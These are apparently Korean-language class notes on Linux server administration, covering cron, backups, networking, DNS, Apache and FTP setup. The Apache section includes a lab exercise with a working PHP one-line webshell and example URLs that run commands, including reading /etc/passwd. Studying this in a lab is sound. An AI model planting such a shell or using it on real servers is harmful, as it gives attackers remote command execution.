				$ exit 

학원 스텝 9 : 잡 스케줄링
	at CMD(/var/spool/at/<Job ID>)
		# service atd restart
		# at 1300			13시에 실행함
		# at -l				목록확인
		# at -r <Job ID>	삭제
		
	crontab(/var/spool/corn/$USER(만든사용자의이름으로만들어짐))
		# service crond restart
		# crontab -e [-u user01]편집하는것
		# crontab -l [-u user01]크론탭파일 리스트 
		# crontab -r [-u user01]크론탭삭제
		[참고] crontab 파일분석
			0 3 1 * 0 /root/bin/backup.sh		(매달 1일 3시 정각 + 매주 일요일)
				매달 1일 3시에 백업을하고 0때문에 매주 일요일도함 시분일은 and지만 일과 요일은 or임 
		[참고] crontab 파일의 대표적인 예제 
			0    3    *    *     *    		/root/bin/backup.sh		(하루에 한번씩)
			0  0,12   *    *     *    		/root/bin/backup.sh 	(하루에 두번씩)
			0    3    *    *     0    		/root/bin/backup.sh		(일주일에 한번씩)
			0    3    *    *    1,3  		/root/bin/backup.sh  	(일주일에 두번씩)
			0    3    1    *     *    		/root/bin/backup.sh		(한달에 한번씩)
			0    3   1,15  *     *   		/root/bin/backup.sh		(한달에 두번씩)
			0    3    1    3,6,9,12    *  	/root/bin/backup.sh		(분기에 한번씩)
		[실무예] crontab + shell script
			(요청) 매달 첫번째 일요일날 
				=> crontab + script.sh
				크론탭만으로는 저렇게 못해서 매달 일요일은 7보다 작기때문에 스크립트에 이 문장을 넣어서 합쳐서 만듬
		[실무예] 쉬는 시간 표시 (시간을 조종하는 능력 필요)		
		[실무예] 업데이트(at CMD)
			# echo shutdown -h | at now +5 min
		[실무예] crontab 명령어 사용 제어
			(요청) oracle과 wasuser만 crontab명령어 사용 가능하게 해달라
			# ls /var/spool/cron	하면 deny만있음 
			# vi /etc/cron.allow	이거는 만들어야함 but 스케쥴러사용자는 allow에 같이 등록해야함 	

학원 스텝 10 : 백업과 복구
	백업? : 데이타나 정보가 지닌 가치를 보존하는 것으로 외부의 침입자로부터 보호, 예기치 못한 사 고로부터의 복원, 시스템 백업은 매일 해야 한다.
	
	백업 종류
		완전 백업
	 증분백업---증분 백업 : 증분 백업은 완전 백업한 이후에 변경된 데이터만을 백업 하는 방법
	      ㄴ--차등 백업 : 차등 백업은 완전 백업이 이뤄진 이후의 모든 데이터에 대해서 백업이 이뤄지도록 하는 방법
		
	백업/복구 명령어 종류 	
		(로컬 백업)
			* tar CMD : 디렉토리 단위의 백업
				# tar cvf|tvf|xfv file.tar [file1 file2]
				# tar cvzf|tvf|xfv file.tar.gz [file1 file2]
				# tar cvjf|tvf|xfv file.tar.bz2 [file1 file2]
				# tar cvJf|tvf|xfv file.tar.xz [file1 file2]
			
				(1) 복구시 일부 파일/디렉토리 복구
				# tar xvzf /backup/home.tar.gz home/user01			/backup/home에는 처음 불백업한 내용이 들어가고 다음부터 이걸 기준으로 바뀐게 있으면 증분하는 형태임 
			
				(2) 증분 백업/복구(tar -g)
				# cd /home
				# tar -g /backup/backup.time -cvzf /backup/full.tar.gz 			풀백업받음
				# tar -g /backup/backup.time -evzf /backup/incremental1.tar.gz  증분백업
				
				# cd /	 절대경로라서 /에서 풀어줘야함 
				# tar -g /backup/backup.time -xvzf /backup/full.tar.gz			복구순서는 풀 다음 1 다음 2 이렇게감 
				# tar -g /backup/backup.time -xvzf /backup/incremental1.tar.gz
				
				(3) 디렉토리 마이그레이션(/test1/* -> /test2/*) cp로하면 안됨 .과 퍼미션이안바뀜 시간과
				# cd /test1
				# tar cf - . | (cd test2; tar xf -)	-는 standardoutput으로 여기서 file.tar정도의 수준 
													뜻은 .(현재폴더)를 -에 백업을 넣고 파이프로 넘겨 테스트2에가서 푸는것
				
				(4) 백업시 제외 디렉토리 지정하기
				# tar cvzf /backup/full.tar.gz \	백업을하는데
				> --exclude=/test/dir \				제외한다 테스트밑에 dir만
				> --absolute-name /					기준은 /밑에 다 백업 
				
		(원격 백업) rsync CMD
			rsync CMD
				(1) rsync -avz --delete -e ssh
					# rsync -avz --delete -e ssh /backup Remote:/remotebackup	백업이란 디렉토리가 동기화되고
					# rsync -avz --delete -e ssh /backup/ Remote:/remotebackup/	백업밑에 파일들이 동기화됨
						Local  -> Local	
							# rsync -avz --delete -e ssh /backup/ /test100/
						Local  -> Remote
							# rsync -avz --delete -e ssh /linux214 192.168.0.249:/backup 
						Remote -> Local
							# rsync -avz --delete -e ssh 192.168.0.249:/backup/linux2XX/ /test101/
				(2)	Server/Client 구성
					(Server)
						# mkdir -p /backup1
						# vi /etc/rsyncd.conf
							uid=nobody 						/* 사용자 아이디 */
							gid=nobody 						/* 그룹 아이디 */
							use chroot=no 					/* yes : 지정된 경로 이외에 다른 경로로 접속 못하게 함 */ 
							max connections=5 				/* 최대 접속자 수 : 0은 무제한을 나타냄 */
							timeout=60 						/* Client의 접속이 idle상태일 때 접속을 끊어버릴 초 단위 시간 */ 
							[Backup] 						/* rsync 서비스명 */
							comment=Rsync Backup Server 	/* rsync 서비스에 대한 설명 */
							path=/backup1 					/* 미러링될 데이터의 경로 (대상파일경로) */
							read only=no 					/* yes : 다운로드 가능 / no : 업로드 가능 */
						# vi /etc/xinetd.d/rsync			디스에이블 예스로 변경
						# service xinetd restart
					(Client)
						# rsync -avz --delete -e ssh server::Backup /backup2	여기서 백업은 서버의vi의 rsyncd.conf편집의 Backup임
						# rsync -avz --delete -e ssh server:/Backup1/ /backup2
						
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------SERVER ADMIN 끝----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
학원 스텝 1
	서비스 종류
		standalone방식(background service)
			(부팅) # chkconfig httpd on        -----> /etc/rc5.d/S85httpd
			(현재) # service httpd restart
				standalone은 이렇게나옴
				# chkconfig --list | grep ssh
				sshd            0:off   1:off   2:on    3:on    4:on    5:on    6:off	
				
		xinetd방식(on demand service) xinet자체는 standalone임
			# service krb5-telnet on
			(부팅) # chkconfig krb5-telnet on  -----> /etc/xinetd.d/krb5-telnet (disable yes -> no)
			(현재) # service xinetd restart
				xinet은 이렇게나옴
					# chkconfig --list | grep telnet 
					krb5-telnet:    on

학원 스텝 2
	네트워크 설정 관리
		네트워크 설정 관련 파일
			/etc/hosts
				아이피(IP)와 호스트 이름(hostname) 또는 도메인 이름(Domain Name)을 맵핑(Mapping)하는 역할
			
			/etc/host.conf(/etc/nsswitch.conf)
				이름 요청(도메인 요청, Naming Service Request)시 도메인/이름 검색 순서
			
			/etc/resolv.conf
				이름 요청을 할 DNS 서버를 지정할 때 사용하는 파일
					search
						example.com이 있으면 nslookup해서 www만써도 www.example.com이나옴
					domain
						???????????????
					nameserver 
						질의를 하는 dns서버를 등록하는것 3개가 최대임
			
			/etc/sysconfig/network
				network 서비스가 읽어 들이는 기본 변수 값이 정의되어 있는 파일
			
			/etc/sysconfig/network-scripts/ifcfg-*
				ifconfig했을때 나오는 명령어들에 대한 내용이 들어간곳
			
			/etc/sysconfig/networking
				위에 관련된것들에 대한 백업본이라고 생각하면됨 
			
		네트워크 설정 확인 명령어
			# ifconfig				현재 활성화된 NIC 설정을 보여준다
			# ifconfig -a 			모든 NIC의 상태 정보를 보여준다 
			# ethtool eth0  		물리적인 연결확인하는 것 link detected가 yes면 연결되어있는것
			# netstat -nr   		기본 게이트웨이 확인하는것 
			# cat /etc/resolv.conf 	DNS설정확인
								
				[장애처리]
				1. # ping 192.168.0.1
					안될때 랜선이나 if가 잘못된것
						# ethtool eth0		물리적연결을 확인 만약 link detected가 yes면
						# ifconfig eth0		ip를 확인해라
				
				2. # ping 192.168.63.1 		DNS에 질의 게이트웨이만 넘으면 되기 때문에
					안될때 Gateway에 문제가 있는것
						# netstat -nr 		기본 게이트웨이 확인해보기 
				
				3. # ping www.google.com	통신되면 되는것 
					안되면  DNS의 IP에 문제가있는것
						# cd /etc/resolv.conf
						
				[참고] ping CMD, traceroute CMD
						# ping 192.168.0.1
						# traceroute 8.8.8.8
				[참고] VMware S/W
				(ㄱ) IP/Netmask/Link 확인
					ethtool
					ifconfig
				(ㄴ) LinuxVM -- 연결 -- VMnet0(Bridge)
					VMware -> VM -> setting -> Network Adapter -> VMnet(0)(Bridge)
				(ㄷ) VMware 서비스 확인
					<CTRL + EXC> => services.msc -> VMware*(5)
				(ㄹ) VMnet0 -- 연결 -- Physical NIC
					VMware -> Edit -> Virtual Network Editor -> Specific NIC
				(ㅁ) Physical NIC 속성 점검
					Pysical NIC -> Propertise -> [v]  VMware Bridge Protocol
				
				[참고] 리눅스 네트워크 오류났을때 
				1. # ping 192.168.0.1
					안될때 랜선이나 ip가 잘못된것
						# ethtool eth0		물리적연결을 확인 만약 link detected가 yes면
						# ifconfig eth0		ip를 확인해라
				2. VMware -> VM -> setting  네트워크 어댑터 연결방식확인 
				3. service.msc(윈도우)		에서 vmware들 다 설정이 올라와있나 확인
				4. virtualnetworkedit
				5. # ping 192.168.63.1 		DNS에 질의 게이트웨이만 넘으면 되기 때문에
					안될때 Gateway에 문제가 있는것
						# netstat -nr 		기본 게이트웨이 확인해보기 
				6. # ping www.google.com	통신되면 되는것 
					안되면  DNS의 IP에 문제가있는것
						# cd /etc/resolv.conf
						
		네트워크 설정 툴 종류
			(TUI) # system-config-network-tui (# setup)
			(GUI) # system-config-network-gui (# neat)
			* service network restart 해줘야 적용됨
			
			[실습] IP 변경 실습
			* IP/Netmask 192.168.0.214/24 -> 172.16.6.214/24
			[실습] NIC 추가 실습
			* NIC
				(eth0)
					IP/Netmask  : 172.16.6.214/24
					GW			: 
				(eth1)
					IP/Netmask	: 192.168.10.214
					GW			: 192.168.10.2
					DNS			: 168.126.63.1
						VMware에서 NAT방식으로 추가
						부팅후 ifconfig하면 두개가나옴 dhcp여서 자동으로 부여된 것 
						eth0와 eth1의 macaddress를 지움 
						이후 service network restart함 동기화됨 
						하지만 게이트웨이가2개 여기서 1개만 디폴드값으로 씀 netstat -nr
			
		이더채널 본딩 
			NIC카드를 2개를 묶어서 1개처럼사용
				fail over 	   : 하나가 망가져도 다른 NIC카드가있기에 가능함 
								복원할때는 새로운 NIC카드만 가져와서 꽃으면 됨(fail back)
				Load Balancing : 부하 분산 기능이다 NIC 카드가 2장일경우 많이사용하는 쪽에서 부하가 일어남 
								따라서 많이 쓰는쪽에 NIC카드를 여러장 달아서 부하를 분산하는 기능을 가짐
			설정방법
				Active-Active(balance-rr)	: 두개가 라운드로빈 방식으로 사용 하나가죽으면 다른한명이수행
				Active-Stanby(Active-Backup): 한개만사용하고 다른거는 대기하고있다가 죽으면 대기가 수행
									
			[실습] Etherchannel Bonding
				(ㄱ) /etc/modprobe.conf
				(ㄴ) /etc/sysconfig/network-scripts/ifcfg-bond0	여기에 아이피가 부여
				(ㄷ) /etc/sysconfig/network-scripts/ifcfg-eth0	여기엔 마스터 슬레이브구조
				(ㄹ) /etc/sysconfig/network-scripts/ifcfg-eth1	여기에 마스터 슬레이브구조
				(ㅁ) reboot

학원 스텝 3
	DNS 서버 관리
		서버의 종류 
			Master DNS Server
			Slave DNS Server
			Caching-only DNS Server	
			Forwarding DNS Server
			
		DNS서버 안에 구성품
			- Forward Zone File(D==>IP)		도메인->ip로		만들어야함 없음 
			- Reverse Zone File(IP==>D)		ip->도메인으로		만들어야함 없음
			- localhost Zone File(Caching) 	캐싱파일임
			- hint File(named.ca)			다른dns를 지정하는 파일
		
		[실습] /etc/hosts 파일에 대한 실습 
	
		[실습] Caching Only DNS 서버 구축 
			# yum -y install caching-nameserver
			# chkconfig named on
			# service named restart 
				* Program 				   : bin, bind-chroot, bind-utils, bind-libs + caching-nameserver			여기있는 패키지가 있어야함
				* Daemon & Port & Protocol : named(53, tcp/udp)														데몬은 named고 포트는 53 프로토콜은 tcp(서버가응답할때)와 udp(클라가요청할때)
				* Config File 			   :  /var/named/chroot/etc/named.{caching-nameserver.conf|rfc1912.zones} 	설정파일들
				* Sub Configuration File(s): /var/named/chroot/var/named/*											서브 설정파일들
				* Startup Script		   : /etc/init.d/named														스타트시키기
		
		[실습] DNS서버구축 
				(주설정)
					# vi /var/named/chroot/etc/named.caching-nameserver.conf	기본적으로 들어오는 ip를 설정하는 파일 rfc1912.zones을 포함
					
					# vi /var/named/chroot/etc/named.rfc1912.zones				zone다음에 .은 무조건 타입이 힌트 파일은named.ca // arpa는 ip -> 도메인으로 바꾸는방식 //""안에 도메인을쓰면 도메인 -> ip로 가는 형식임
						zone "." IN {
								type hint;
								file "named.ca";
						};
						zone "linux2XX.example.com" IN {	  /* Forward Zone */
        						type master;		
        						file "example2XX.zone";	  /* Forward Zone File : /var/named/exampleXXX.zone */
						};
						zone "6.16.172.in-addr.arpa"  IN {	  /* Reverse Zone */
								type master;		
								file "example2XX.rev";	  /* Reverse Zone File : /var/named/exampleXXX.rev */
						};
				
				(ZONE 파일)
					# vi /var/named/chroot/var/named/named.ca												. 파일에 대한 내용들을 생성하는것이다 실무에선 정해져있어서 안해도됨 
						.                       86400   IN      NS      ns1.example.com.
						ns1.example.com.        86400   IN      A       172.16.6.252
					
					# vi /var/named/chroot/var/named/example2XX.zone										포워드 존(Forward-Zone) 파일 생성
						$TTL    4																			질의를 하는 시간 4초로 로컬에 1만초동안있으면 서버에서 동기화해도 계속 로컬에서 가지고서씀
						@               IN SOA  ns1.linux2XX.example.com. root.linux2XX.example.com. (		SOA는 스타트 오브 어소시에이트? 쨋든 이뒤에는 DNS서버를 관리한다는 듯이다 .는 문장의끝을 표시 안쓰면 다이어짐
                                        42              ; serial (d. adams)
                                        3H              ; refresh
                                        15M             ; retry
                                        1W              ; expiry
                                        1D )            ; minimum											밑에 ns1은 위에 soa로 정의한 .linux2XX.example.com.임		앞뒤 . 필수 
             					IN 	NS           ns1														IN때문에 앞에 도메인이름(비면 오리지날임 ) 뒤에 아이피 NS는 네임서버 이름으로 쓸수있게함 
						ns1 	IN 	A            172.16.6.2XX
					
					# vi /var/named/chroot/var/named/example2XX.rev											리버스 존(Reverse-Zone) 파일 생성
						$TTL    4
						@       IN      SOA     ns1.linux2XX.example.com. root.linux2XX.example.com.  (
                                      1997022700 ; Serial
                                      28800      ; Refresh
                                      14400      ; Retry
                                      3600000    ; Expire
                                      86400 )    ; Minimum
						IN      NS      ns1.linux2XX.example.com.
						2XX     IN      PTR     ns1.linux2XX.example.com.									ptr은 앞에 ip가오고 뒤에는 전체 도메인이름이옴 
					
				(서비스 기동)
					# service named restart
					# chkconfig named on
			
		[실습] nslookup/dig/host CMD 사용법(질의명령어임)
		
		[실습] 도메인 등록
			■ RR(Record Type, Resource Record) 종류에 따른 등록 방법
				------------------------------------------------------------------------------------
				(ㄱ) NS Record Type (Name Server)											이름으로 등록 	 		example.com.	IN	NS	ns1.linux2XX.example.com.
					linux2XX.example.com.	IN	NS	ns1.linux2XX.example.com.									ns				IN	A	172.16.6.214
					ns1.linux2XX.example.com.	IN	A	172.16.6.2XX
				------------------------------------------------------------------------------------
				(ㄴ) A Record Type (Address)													주소로 등록	:	  		WWW				IN	A	172.16.6.214
					www.linux2XX.example.com.	IN	A	172.16.6.2XX	
					ftp.linux2XX.example.com.	IN	A	172.16.6.2XX
					cafe.linux2XX.example.com. IN      	A        172.16.6.2XX
														
				(ㄷ) MX Record Type (Mail Exchange)											메일등록 메일만2줄로 mx뒤에 숫자는 우선순위 클수록 낮은것	example.com. IN A	mail.example.com.
						linux2XX.example.com.	 IN	MX 10	mail.linux2XX.example.com.												mail.linux2XX.example.com.	 IN	A	172.16.6.2XX	
					mail.linux2XX.example.com.	 IN	A	172.16.6.2XX
					linux2XX.example.com.	 IN	MX 20	mail2.linux2XX.example.com.
					mail2.linux2XX.example.com. IN	A	172.16.6.241
				
				(ㄹ) CNAME Record Type (Canonical Name)										별칭					www                	IN	A	172.16.6.2XX				
					www                	IN	A	172.16.6.2XX
					ftp                	IN	A	172.16.6.2XX
					or
					www			IN	A	172.16.6.2XX
					ftp			IN	CNAME	www
				------------------------------------------------------------------------------------
				(ㅁ) PTR Record Type (Pointer Address)										위에는 forwardzone이고 여기는 rev에서 많이씀		2XX			IN	PTR	ns1.linux2XX.example.com
					2XX			IN	PTR	ns1.linux2XX.example.com.
					2XX			IN	PTR	www.linux2XX.example.com.
				------------------------------------------------------------------------------------
		
				(도메인 등록 방법)
				
					(ㄱ) Forward Zone 파일에 등록																새로운 서버가 추가되면 여기에만 자주함(실무에서)
						# vi /var/named/chroot/var/named/exampleXXX.zone (Domain -> IP)
							-> 반드시 등록 해야 함.                         (www     IN    A    172.16.6.2XX)
								;; (1) WEB Server 
								www      		IN      A       172.16.6.2XX 
								
					(ㄴ) Reverse Zone 파일에 등록																반드시DNS서버는 등록해야함
						# vi /var/named/chroot/var/named/exampleXXX.rev  (IP -> Domain)
							-> 반드시 등록할 필요 없음.                      (2XX     IN    PTR  www)
		
		[실습] DNS + WEB 연동실습
		[실습] DNS 웹부하분산
		[실습] DNS 도메인 위임(Domain Delegation)
		[실습] Master/Slave DNS Server					한가지 도메인에 총 2개의 DNS서버가 존재함
			# vi /etc/named.rfc1912.zones
				마스터에는 vi /etc/named.rfc1912.zones     이런식으로 라인을 2줄을 추가 
				zone "6.16.172.in-addr.arpa" IN {
				type master;		
				file "example2XX.rev";
				also-notify { 172.16.6.1XX };   		<----- 라인 추가
				};
				zone "linux2XX.example.com"  IN {
				type master;		
				file "example2XX.zone";
				also-notify { 172.16.6.1XX; };   		<----- 라인 추가
				};
	
			# vi /var/named/chroot/var/named/example2XX.zone	도메인 정보 추가
				                IN NS           ns1
								IN NS           ns2              <----- 새로운 라인 추가 및 수정
				ns1             IN A            172.16.6.2XX
				ns2             IN A            172.16.6.1XX     <----- 새로운 라인 추가 및 수정
			
			# vi /var/named/chroot/var/named/example2XX.rev		도메인 정보 추가
								IN      NS      ns1.linux2XX.example.com.
								IN      NS      ns2.linux2XX.example.com.    <----- 새로운 라인 추가
				2XX     IN      PTR     ns1.linux2XX.example.com.
				1XX     IN      PTR     ns2.linux2XX.example.com.   		 <----- 새로운 라인 추가
			
			# service named restart	재가동!
			
		[실습] Master/Slave DNS Server - zone date update 실습 (마스터에서 바꿔서 service named restart하면 슬레이브도 다 바뀜)
			zone 데이터를 변경 할때는 반드시 serial number값을 기존의 값보다 높여줘야함 그래야 슬레이브가 동기화를 해준다.
			
		[실습] rndc CMD 실습 
			* rndc-confgen 		여기서 나온것을 
			* /etc/rndc.conf	여기엔 원격 클라이언트설정파일임 위에나온것중 위에꺼 넣기
			* /etc/named.conf	여기엔 서버 설정파일로써 위에서 나온것중 밑에꺼 넣기 
		
		[참고] system-config-bind
			# yum -y install system-config-bind
			# system-config-bind &					DNS서버 툴로 설정하는것 

		[참고] nsupdate CMD/allow-update(DDNS)
			nsupdate로 원격으로 DNS서버 업데이트
			allow-update로 ip를 지정해서 원격으로 조종할수있는 아이피만 허용
			# vi /etc/named.caching-nameserver.conf		전체에 효과	allow-update { IP; };
			# vi /etc/named.rfc1912.zones				해당 IP에만 효과 
		
		[실습] allow-transfer	마스터DNS에서 슬레이브DNS지정할때 사용 특정 슬레이브만 가져갈수있도록 설정할수있는것 
			# vi /etc/named.caching-nameserver.conf 	전체에 효과	allow-transfer { IP; };
			# vi /etc/named.rfc1912.zones				해당 IP에만 효과
			
	DNS Server Security
		[실습] DNS Server Security Check Site
			-http://krnic.or.kr/jsp/business/operate/dnsModify.jsp
		[실습] chroot 구성		 BIND 프로그램을 통해 DNS 서버를 구성하는 경우 chroot 환경을 사용
			# yum -y install bind-chroot caching-nameserver
			1.보안상유리	    : chroot로하면 해커가 들어와서 아무리 높은 상위폴더로가도 chroot가 root로만됨 따라서 피해가 확산되지않음 
			2.사용자로 실행가능	: 0~1023까지는 root가 아니면 실행이 안됨 하지만 chroot로 하면 실행이 가능해짐
		[참고] bind 업데이트/패치
			# yum -y update bind (# yum -y install bind)
		[참고] update-transfer, allow-query, allow-update
			update-transfer : { $(slave DNS); } ; 			MASTER에서 지정하는것
			allow-query		: { $(회사내부네트워크); } ; 		서버에서지정하는것(마스터나 슬레이브 상관X)
			allow-update	: { $(nsupdate 명령어 수행 서버); };서버에다 지정해놔서 외부ip만 사용가능함 
		[참고] 최신 보안 버그
			http://www.isc.org/software/bind
		[참고] DNSSEC
			(ㄱ) 평문으로 전송하는 DNS를 암호화함
			(ㄴ) 인증/인가/무결성 
		[참고] DNS 모니터링
			(무료)Cacti/RRDTool/*MRTG - 그래프 방식
			(유료)*PRTG
			(무료)dnstop			     - tui 방식
	
학원 스텝 4
	WEB 서버 관리 
		* 용어
			HTTP						: 하이퍼텍스트 전송 규약
			HTTPS						: HTTP + Security
			Web Server 					: 하이퍼 텍스트를 제공하는 서버
				Apache - 정적페이지 구현 (html,jpg,jpeg)	요청했을때 그대로 들어와서 해석하고 보여줌
			WAS(Web Application Server) : 웹과 기업의 기간 시스템 사이에 위치하면서, 웹 기반 분산 시스템 개발을 쉽게 도와주고 안정적인 트랙잰션 처리를 보장해 주는 일종의 미들웨어 소프트웨어 서버.
				Tomcat - 동적페이지 구현 (jsp,asp)			요청했을때 빈공간을 동적으로 채워서 보여줌

			HTTP Request
				Method : GET, POST, .....
			HTTP Response
				HTTP Response Code : 200(ok), 404(not found), .....
			
			Apache httpd 2.2 : process
				한글을 4번실행한다고했을때 변하지않는 한글.exe가 4개를 메모리에올리고 각자 동적 메모리가 올라간다 공통한글이 4개나 올라가서 메모리 낭비가 생김
			Apache httpd 2.4 : thread
				이건 2.2버전과달리 한글.exe가 한개만떠서 변하지않기때문에 공통으로 사용해 메모리를 효율적으로 사용한다 하지만 heap메모리로 미리 공간을 잡고 들어가야함 
			
			CGI(Common Gateway Interface) : 동적페이지 제공, 실행권한필요(요즘은 jsp와 asp로 쓰임 이건 실행권한필요x)
			
		Apache WEB Server
			* Package 	 	  : httpd(필수), httpd-manual, system-config-httpd
			* Daemon  	 	  : httpd
			* Port	  		  : http=80 https=443
			* Protocol	 	  : TCP
			* Config File 	  : /etc/httpd/conf/httpd.conf
			* Sub Config File : /etc/httpd/conf.d/*.conf
			* Startup Script  : /etc/init.d/httpd
				[실습] 간단한 웹서버 구성
					# yum -y install httpd mod_ssl mod_perl mod_python
					# vi /etc/httpd/conf/httpd.conf
					# vi /var/www/html/index.html
					# service httpd restart
					# chkconfig httpd on
				[실습] 웹 클라이언트 툴 사용법 
					* firefox
					* curl/lynx CMD
					* telnet/nc CMD
				
				[실습] 개별 사용자 웹서버 구성(httpd.conf(UserDir))
					# vi /etc/httpd/conf/httpd.conf					설정파일에서 개인도 웹서버 할수있도록 변경한것 밑에내용
					userdir public_html
					# su - user01									유저로 넘어가기
					$ chmod 755 .									user01에게 권한주기
					$ mkdir -p public_html							폴더 만들기
					$ vi public_html/index.html						html코드 폴더밑에 index.html형식으로 만들기 
				
				[실습] 개별 사용자 웹서버 구성2(httpd.conof(Alias))
					# vi /etc/httpd/conf/httpd.conf
					Alias /user01/ /home/user01/public_html/		www로 요청하면 저 home/user01/public_html 동선으로 가서 요청하는것 
					# vi public_html/index.html
				
				[실습] index 파일 설정(httpd.conf(DirectoryIndex))
					# vi /etc/httpd/conf/httpd.conf
					DirectoryIndex default.html index.html index.html.var	앞에순서부터 읽혀짐
					# vi /var/www/hgtml/default.html						내용넣고 파이어폭스로 214로 돌리기
				
				[실습] ServerAdmin, ServerName 지시자 
				
				[실습] ServerName, DocumentRoot, Directory 지시자
					* /var/www/html -> /www1
				
				[실습] CGI설정(SciptAlias) - /bin/bash
					# vi /etc/httpd/conf/httpd.conf
					ScriptAlias /cgi-bin/ /www1/cgi-bin/
					# vi /www1/cgi-bin/test.cgi
				
				[실습] CGI설정 - perl 언어(conf.d/perl.conf)
				
				[실습] CGI설정 - php 언어 (conf.d/php.conf)
				
				[실습] WebShell 실습 
					PHP - One line Webshell		위에 주소창에서 원하는 명령어치면 나옴
						<pre>
						<?php echo shell_exec($_GET['cmd']); ?>	쉘을시작한다 명령어를 형식은 밑에 
						<pre>
						# firefox http://www.linux2XX.example.com/cmd.php?cmd=ls
						# firefox http://www.linux2XX.example.com/cmd.php?cmd=ifconfig
						# firefox http://www.linux2XX.example.com/cmd.php?cmd=cat /etc/passwd	이런형식으로 사용 
				
				[실습] .htaccess 파일을 이용한 웹페이지 보안 
					# vi /etc/httpd/conf/httpd.conf
						<Directory /www1>
							AllowOverride AuthConfig        <---- 라인 추가
						</Directory>
					# vi /www1/.htaccess					이파일이있으면 거기해당한거 읽을때는 암호를치고 들어가야함
					# htpasswd -mc /etc/httpd/conf/mypasswd testuser	해당 패스워드에대한 유저와 패스워드를 만드는것 
				
				[실습] 가상호스트(Virtual Hosting) - Name-based Virtual Hosting
					# vi /www1/index.html
					# vi /www2/index.html
					# vi /www3/index.html	등이 필요하고 주설정파일에 등록하기 
				
				[실습] 가상호스트(Virtual Hosting - IP-based Virtual Hosting
				
				[실습] 서버 정보 / 서버 상태 / 통계 자료
					서버 정보(http://www.linux214.example.com/server-info)
						# vi /etc/httpd/conf/httpd.conf  여기서 /server-info 편집
					서버 상태(http://www.linux214.example.com/server-status)
						# vi /etc/httpd/conf/httpd.conf  여기서 /server-status 편집
					통계 자료(http://localhost/usage) 
						# cat /etc/httpd/conf.d/webalizer.conf
				
				[실습] 아파치 버전/운영체제 버전 정보 숨기기 
					버전 확인
						# lynx -head http://www.linux2XX.example.com 
					방어
						# vi /etc/httpd/conf/httpd.conf  여기서 /ServerToken OS 에서 os를 prod로 바꾸기
			
		보안(Security)	
			[참고] WAF(Web Application Firewall)
			[참고] 웹서버 취약점 점검 
				https://www.krcert.or.kr/webprotect/webVulnerability.do 여기서 점검 가능 중소기업에 한해서 
			[참고] APM(Apache + PHP + MySQL)
				(a) 패키지 형태 설치
				(b) 소스 형태 설치 
			[참고] HTTPS 사이트 설정 
				# yum -y install httpd mod_ssl   
			[참고]http상태코드
				300 - 리다이렉션
				400 - 클라이언트오류
					403 : Forbidden
					404 : Not Found
				500 - 서버오류
					500 : Internal Server Error

학원 스텝 5
	FTP 서버 관리 
		* Package 	 	  : vsftpd, ftp
		* Daemon  	 	  : vsftpd
		* Port	  		  : 21,20
		* Protocol	 	  : TCP
		* Config File 	  : /etc/vsftpd/vsftpd.conf
		* Sub Config File : /etc/vsftpd/{user_list,ftpusers}
		* Startup Script  : /etc/init.d/vsftpd
			
			[실습] FTP 서비스(vsftpd) 기동 및 root 사용자 접속
				# service vsftpd restart
				# chkconfig vsftpd on
				# vi /etc/vsftpd/{ftpusers,user_list}
			
			[실습] FTP 서버에 접속할 수 없는 사용자 등록
				/etc/vsftpd/{ftpusers,user_list}
			
			[실습] FTP 클라이언트 툴/명령어
				* gftp 툴
				* ftp CMD
				* Linux Clinet -> Linux Server
				* Window Client -> Linux Server 
			
			[실습] 베너 메세지 설정 (안하면 ftp버전정보가 보여짐)
				# vi /etc/vsftpd/vsftpd.conf 					   에다가 
				banner_file=/etc/vsftpd/banner.txt           <---- 마지막 라인에 추가
				# vi /etc/vsftpd/banner.txt						   파일 만들어서 베너 메시지 넣기 
			
			[실습] Greeting 메시지 설정 (안하면 ftp버전정보가 보여짐)
				# vi /etc/vsftpd/vsftpd.conf 
				#ftpd_banner=Welcome to blah FTP service.    <----- 주석을 제거
		
		FTP보안설정
		
			[실습] FTP사용자 chroot 구성
				# vi /etc/vsftpd/vsftpd.conf 
				chroot_local_user=YES                        <----- 문서의 마지막 부분에 새로운 라인 추가
	
			[실습] 사용자 접근 제어 - 지정된 사용자만 FTP서버에 접근 가능하도록 
				# vi /etc/vsftpd/vsftpd.conf
				userlist_enable=YES							user_list폴더 사용하느냐 물어보는것
				userlist_deny=NO							user_list폴더안에있는 사용자 거부할것인가 ?
				#vi /etc/vsftpd/user_list	원하는 유저 밑에 3개만 등록하면 이것만 들어올수있게할수있음
				root
				oracle
				wasuser
			
			[실습] Anonymous FTP 설정
				# vi /etc/vsftpd/vsftpd.conf 
					anonymous_enable=YES		익명사용자 사용여부
					anon_upload_enable=YES		익명사용자 업로드 가능여부
					anon_mkdir_write_enalbe=YES 익명사용자가 쓰기가능
			
			[실습] Anonymous FTP 구성 - 디렉토리 이름과 파일이름 알고 있는 경우에만 다운로드 가능 
				# mkdir -m 751 -p /var/ftp/pub/download
				# mkdir -m 751 -p /var/ftp/pub/download/os
				# mkdir -m 751 -p /var/ftp/pub/download/os/centos
		
		FTP관리설정	
			
			[실습] FTP 서비스 포트 변경(21-2121)
				# vi /etc/vsftpd/vsftpd.conf 
					listen_port=2121           <----- 마지막 라인에 추가
				# service vsftpd restart 
				# ftp localhost 2121			포트가 바뀌면 번호를써줘야함 뒤에 
			
			[실습] FTP 서버 접속 개수 제한
				# vi /etc/vsftpd/vsftpd.conf 
					max_clients=100				클라이언트 붙을수있는수
					max_per_ip=3				ip접속 가능수 
			
			[실습] Anonymous FTP 서버 파일 업로드 설정
				# vi /etc/vsftpd/vsftpd.conf
					anon_upload_enable=YES 		익명사용자가 업로드 가능하게 함
					chown_uploads=YES	
					chown_username=ftpupload	유저네임으로 파일을 업로드한다 
				# mkdir -m 603 -p /var/ftp/pub/incoming 
				# useradd -d /var/ftp/pub/incoming -r -s /sbin/nologin ftpupload
	
	FTP 보안	
		* 호스트 접근 제어	: iptables, tcp_wrapper
		* 사용자 접근 제어	: /etc/vsftpd/{ftpusers,user_list}
		* 프로그램 업데이트	: yum -y install vsftpd
		* 최신 보안 경고문	: # cd /usr/share/doc/vsftpd-*
	
	FTP 포트 관리 
		* passive mode	: 21번기본사용 데이터전송시 1024↑꺼 사용
		* Active mode	: 21번기본사용 데이터전송시 20번
		* FTP 포트 변경
	
	FTP 로그
		* /var/log/secure  : ftp접속시 비밀번호치고 실패하면 쌓임
